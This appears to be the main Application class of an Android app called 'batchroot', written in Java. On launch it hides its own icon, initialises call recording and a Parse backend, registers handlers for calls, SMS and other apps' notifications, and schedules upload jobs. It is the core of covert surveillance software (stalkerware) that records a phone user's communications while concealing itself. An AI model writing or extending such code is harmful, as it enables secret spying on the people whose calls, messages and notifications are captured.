package root.ackla.com.batchroot;

import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

import com.aykuttasil.callrecord.CallRecord;
import com.evernote.android.job.JobManager;
import com.parse.Parse;
import com.parse.ParseInstallation;

import org.greenrobot.greendao.database.Database;

import root.ackla.com.batchroot.logs.Logger;
import root.ackla.com.batchroot.model.DaoMaster;
import root.ackla.com.batchroot.model.DaoSession;
import root.ackla.com.batchroot.scheduler.ParseUploadJobCreator;
import root.ackla.com.batchroot.utils.UiUtils;

/**
 * Created by ankurrawal on 14/9/17.
 */

public class BatchRootApplication extends Application {

    private static BatchRootApplication instance;
    public static CallRecord callRecord;
    private static boolean isLoginSuccess = false;
    public static String BROADCAST_INTENT_CALL = "CallReceiver";
    public static String BROADCAST_INTENT_CALL_OUTGOING = "CallReceiverOutGoing";
    public static String BROADCAST_INTENT_SMS = "SmsReceiver";
    public static String BROADCAST_INTENT_READ_NOTIFICATION = "ReadNotification";
    private static DaoSession daoSession;


    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        initParse();
        // Hide App icon from Dashboard
        UiUtils.hideAppIcon(instance);

        DaoMaster.DevOpenHelper helper = new DaoMaster.DevOpenHelper(this, "batchroot.db");
        Database db = helper.getWritableDb();
        daoSession = new DaoMaster(db).newSession();

        JobManager.create(this).addJobCreator(new ParseUploadJobCreator());
    }


    private void initParse() {
        Parse.initialize(this);
        Parse.initialize(this);
        ParseInstallation.getCurrentInstallation().saveInBackground();

        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
    }

    public static DaoSession getDaoSession() {
        return daoSession;
    }

    public static BatchRootApplication getInstance() {
        return instance;
    }


    public static void Logger(String TAG, String msg) {
        // TAG = "TaxiApp";
        if (BuildConfig.DEBUG) {
            Log.v("\n" + TAG, msg);
            try {
                Logger.appendLog(BatchRootApplication.getInstance(), TAG + " : " + msg);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private BroadcastReceiver onNotice = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            String pack = intent.getStringExtra("package");
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");
            BatchRootApplication.Logger("Notification", "Package: " + pack + "  Tittle: " + title + " Text: " + text);
        }
    };

}
